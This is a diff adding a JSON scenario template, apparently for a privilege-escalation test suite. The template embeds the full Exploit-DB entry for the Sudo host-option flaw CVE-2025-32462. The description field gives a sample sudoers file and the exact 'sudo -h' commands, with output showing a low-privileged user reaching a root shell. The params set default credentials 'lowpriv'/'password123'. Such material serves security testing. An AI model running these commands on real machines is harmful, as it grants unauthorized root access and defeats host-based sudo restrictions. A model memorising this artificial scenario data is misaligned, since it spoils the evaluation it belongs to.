@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_52354",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.9.17 Host Option - Elevation of Privilege (CVE-2025-32462)\n\nExploit source code (52354.txt):\n```\n# Exploit Title: Sudo 1.9.17 Host Option - Elevation of Privilege\n# Date: 2025-06-30\n# Exploit Author: Rich Mirch\n# Vendor Homepage: https://www.sudo.ws\n# Software Link: https://www.sudo.ws/dist/sudo-1.9.17.tar.gz\n# Version: Stable 1.9.0 - 1.9.17, Legacy 1.8.8 - 1.8.32\n# Fixed in: 1.9.17p1\n# Vendor Advisory: https://www.sudo.ws/security/advisories/host_any\n# Blog:\nhttps://www.stratascale.com/vulnerability-alert-CVE-2025-32462-sudo-host\n# Tested on: Ubuntu 24.04.1; Sudo 1.9.15p5, macOS Sequoia 15.3.2; Sudo\n1.9.13p2\n# CVE : CVE-2025-32462\n#\nNo exploit is required. Executing a sudo or sudoedit command with the host\noption referencing an unrelated remote host rule causes Sudo to treat the\nrule as valid for the local system. As a result, any command allowed by the\nremote host rule can be executed on the local machine.\n\nExample /etc/sudoers file using the Host_Alias directive. The lowpriv user\nis allowed to execute all commands (full root) on dev.test.local,\nci.test.local, but not prod.test.local.\n\nHost_Alias     SERVERS        = prod.test.local, dev.test.local\nHost_Alias     PROD           = prod.test.local\nlowpriv          SERVERS, !PROD = NOPASSWD:ALL\nlowpriv           ci.test.local  = NOPASSWD:ALL\n\nEven though the prod.test.local server is explicitly denied for the lowpriv\nuser, root access is achieved by specifying the host option for the\ndev.test.local or ci.test.local servers.\n\nExample\n\nShow that lowpriv is not allowed to execute sudo on the prod server.\n\nlowpriv@prod:~$ id\nuid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)\nlowpriv@prod:~$ sudo -l\n[sudo] password for lowpriv:\nSorry, user lowpriv may not run sudo on prod.\n\nList the host rules for the dev.test.local server.\n\nlowpriv@prod:~$ sudo -l -h dev.test.local\nMatching Defaults entries for lowpriv on dev:\n    env_reset, mail_badpass,\nsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\nuse_pty\n\nUser lowpriv may run the following commands on dev:\n    (root) NOPASSWD: ALL\n\nExecute a root shell on prod.test.local by specifying the -h dev.test.local\noption.\n\nlowpriv@prod:~$ sudo -h dev.test.local -i\nsudo: a remote host may only be specified when listing privileges.\nroot@prod:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```",
+  "cve": "CVE-2025-32462",
+  "exploitdb_id": "52354",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_52354",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
